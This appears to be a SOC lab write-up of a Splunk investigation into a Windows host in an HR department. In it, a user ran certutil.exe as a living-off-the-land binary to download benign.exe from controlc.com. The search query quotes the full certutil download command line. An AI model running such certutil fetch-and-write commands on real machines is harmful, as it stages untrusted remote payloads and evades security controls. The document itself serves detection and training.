# LOLBIN Payload Download – HR User Investigation

## Objective
Identify which user from the HR department executed a Living-off-the-Land Binary (LOLBIN) to download a payload from an external file-sharing service.

## Query Used
```spl
index=win_eventlogs HostName="*HR*" CommandLine="certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe"

```
## Time Range / Filters Applied

Investigation scoped to March 2022, configured via the Splunk UI.

The query filters for:

HostName="*HR*" to isolate hosts within the HR department

A specific CommandLine indicating use of certutil.exe for remote file download

## Explanation

index=win_eventlogs specifies the Windows Event Logs index containing process creation events (Event ID 4688).

certutil.exe is a legitimate Windows utility that can be abused as a Living-off-the-Land Binary (LOLBIN) to download files from the internet.

The -urlcache -f flags instruct certutil to fetch a remote resource and force it to be written to disk.

The command downloads a file named benign.exe from an external file-sharing service, a common technique used by attackers to bypass security controls.

Analysis of the user context associated with this execution shows that the process was launched by the HR department user Haroon.

## Result

HR user executing the LOLBIN: Haroon

LOLBIN used: certutil.exe

Downloaded file: benign.exe

External source: controlc.com

Technique observed: Living-off-the-Land Binary abuse for payload delivery

## Why This Matters

The abuse of LOLBINs such as certutil.exe allows attackers to blend malicious activity with legitimate system utilities, making detection more difficult. Identifying this behavior enables SOC analysts to:

Detect stealthy payload delivery techniques

Attribute malicious activity to specific users and departments

Improve detection rules and alerting for LOLBIN abuse

This finding confirms malicious payload download activity originating from an HR department host and supports continued investigation into post-exploitation behavior.
